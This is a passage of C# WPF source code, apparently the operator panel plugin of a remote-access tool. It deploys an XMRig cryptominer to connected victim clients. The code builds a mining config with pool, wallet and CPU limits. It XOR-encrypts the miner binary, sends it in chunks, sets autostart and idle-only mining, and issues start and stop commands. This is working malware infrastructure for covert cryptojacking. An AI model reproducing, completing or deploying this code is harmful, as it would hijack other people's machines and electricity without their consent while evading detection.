                string pool = _poolBox.Text.Trim();
                string worker = _workerBox.Text.Trim();
                int cpuPct = (int)_cpuSlider.Value;
                bool autoStart = _autoStartChk.IsChecked == true;
                bool idleOnly = _idleMiningChk.IsChecked == true;

                _progress.Value = 50;

                string configJson = MinerPlugin.BuildMinerConfig(pool, wallet, worker, cpuPct, idleOnly);

                Log("Encrypting binary...");
                byte[] encrypted = MinerPlugin.XorEncrypt(_xmrigBinary);
                _progress.Value = 60;

                Log("Sending config...");
                await SendChunked(0x21, Encoding.UTF8.GetBytes(configJson));
                _progress.Value = 75;

                Log("Sending encrypted binary...");
                await SendChunked(0x20, encrypted);
                _progress.Value = 90;

                byte[] sp = new byte[2];
                sp[0] = 0x11;
                sp[1] = (byte)(autoStart ? 1 : 0);
                await _context.SendToClient(sp);

                byte[] tp = new byte[2];
                tp[0] = 0x12;
                tp[1] = (byte)(cpuPct > 50 ? 0 : Math.Max(1, Environment.ProcessorCount * cpuPct / 100));
                await _context.SendToClient(tp);

                _plugin.SetKeepAlive(_context.ClientId, true);

                Log("Deploy complete. Click Start to launch.");
                _startBtn.IsEnabled = true;
                _statusText.Text = "Deployed";
                _progress.Value = 100;
            }
            catch (Exception ex)
            {
                Log("Error: " + ex.Message);
                _statusText.Text = "Failed";
            }
            finally
            {
                _busy = false;
                _buildBtn.IsEnabled = true;
                await Task.Delay(1500);
                _progress.Visibility = Visibility.Collapsed;
            }
        }

        async Task SendChunked(byte cmd, byte[] data)
        {
            int remaining = data.Length;
            int sent = 0;
            bool first = true;
            while (remaining > 0)
            {
                int chunkLen = Math.Min(remaining, CHUNK_SIZE);
                byte[] packet;
                if (first)
                {
                    packet = new byte[5 + chunkLen];
                    packet[0] = cmd;
                    packet[1] = (byte)(data.Length & 0xFF);
                    packet[2] = (byte)((data.Length >> 8) & 0xFF);
                    packet[3] = (byte)((data.Length >> 16) & 0xFF);
                    packet[4] = (byte)((data.Length >> 24) & 0xFF);
                    Buffer.BlockCopy(data, sent, packet, 5, chunkLen);
                    first = false;
                }
                else
                {
                    packet = new byte[1 + chunkLen];
                    packet[0] = 0x22;
                    Buffer.BlockCopy(data, sent, packet, 1, chunkLen);
                }
                await _context.SendToClient(packet);
                sent += chunkLen;
                remaining -= chunkLen;
                if (remaining > 0) await Task.Delay(3);
            }
        }

        async Task SendCmd(byte cmd, string msg)
        {
            try
            {
                await _context.SendToClient(new byte[] { cmd });
                Log(msg);
                if (cmd == 0x30) { _startBtn.IsEnabled = false; _stopBtn.IsEnabled = true; _statusText.Text = "Starting..."; }
                if (cmd == 0x31) { _startBtn.IsEnabled = true; _stopBtn.IsEnabled = false; _statusText.Text = "Stopped"; _plugin.SetKeepAlive(_context.ClientId, false); }
            }
            catch (Exception ex) { Log("Failed: " + ex.Message); }
        }

        public void HandleServerData(byte[] data)
        {
            if (_disposed || data == null || data.Length == 0) return;
            Dispatcher.BeginInvoke(() =>
            {
                if (_disposed) return;
                try
                {
                    switch (data[0])
                    {
                        case 0xFD: if (data.Length > 1) Log("[C] " + Encoding.UTF8.GetString(data, 1, data.Length - 1)); break;
                        case 0xFE: if (data.Length > 2)
                            {
                                string text = Encoding.UTF8.GetString(data, 2, data.Length - 2);
                                Log("[OK] " + text);
                                if (text.StartsWith("Binary OK [") && text.Contains("]"))
                                {
                                    int start = text.IndexOf('[') + 1;
                                    int end = text.IndexOf(']');
                                    string exeName = text.Substring(start, end - start);
                                    _plugin.SetClientExeName(_context.ClientId, exeName);
                                }
                            }
                            break;
                        case 0xFF: if (data.Length > 2) Log("[ERR] " + Encoding.UTF8.GetString(data, 2, data.Length - 2)); break;
                    }
                }
                catch { }
            });
        }

        void Log(string msg)
        {
            if (_disposed) return;
            if (!Dispatcher.CheckAccess()) { Dispatcher.BeginInvoke(() => LogI(msg)); return; }
            LogI(msg);
        }

        void LogI(string msg)
        {
            if (_disposed) return;
            string line = "[" + DateTime.Now.ToString("HH:mm:ss") + "] " + msg + "\n";
            _logBox.AppendText(line);
            _logBox.ScrollToEnd();
        }

        Button MakeBtn(string text, Color bg, Color hv, SolidColorBrush fg)
        {
            var nb = new SolidColorBrush(bg); var hb = new SolidColorBrush(hv);
            var bb = new SolidColorBrush(C("ButtonBorderColor")); var db = new SolidColorBrush(C("ButtonBgColor"));
            var tp = new ControlTemplate(typeof(Button));
            var bd = new FrameworkElementFactory(typeof(Border), "bd");
            bd.SetValue(Border.BackgroundProperty, nb); bd.SetValue(Border.BorderBrushProperty, bb);
            bd.SetValue(Border.BorderThicknessProperty, new Thickness(1)); bd.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            bd.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4)); bd.SetValue(Border.SnapsToDevicePixelsProperty, true);
            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            bd.AppendChild(cp); tp.VisualTree = bd;
            var h = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true }; h.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); tp.Triggers.Add(h);
            var p = new Trigger { Property = ButtonBase.IsPressedProperty, Value = true }; p.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); p.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd")); tp.Triggers.Add(p);
            var d = new Trigger { Property = UIElement.IsEnabledProperty, Value = false }; d.Setters.Add(new Setter(Border.BackgroundProperty, db, "bd")); d.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp")); tp.Triggers.Add(d);
            return new Button { Content = text, Template = tp, Foreground = fg, Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
        }

        static string FormatSize(long bytes)
        {
            if (bytes < 1024) return bytes + " B";
            if (bytes < 1024 * 1024) return (bytes / 1024.0).ToString("F1") + " KB";
            return (bytes / 1024.0 / 1024.0).ToString("F1") + " MB";
        }

        public void Dispose() { _disposed = true; }
    }
}
